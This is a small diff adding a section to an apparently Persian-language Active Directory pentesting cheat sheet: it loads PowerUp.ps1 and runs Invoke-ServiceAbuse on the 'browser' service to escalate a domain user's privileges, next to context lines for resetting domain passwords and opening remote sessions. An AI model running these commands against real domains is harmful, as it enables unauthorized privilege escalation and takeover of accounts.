@@ -514,6 +514,13 @@ Set-DomainUserPassword -Identity user1 -verbose
 Enter-PSSession -ComputerName COMPUTERNAME -Credential “”
 ```
 
+### ارتقا دسترسی با سرویس browser
+
+```text
+. .\PowerUp.ps1
+Invoke-ServiceAbuse -Name ‘browser’ -UserName ‘domain\user1’
+```
+
 ### ارتقا دسترسی با استفاده از سرویس Sql و ActiveSessions
 
 ```text
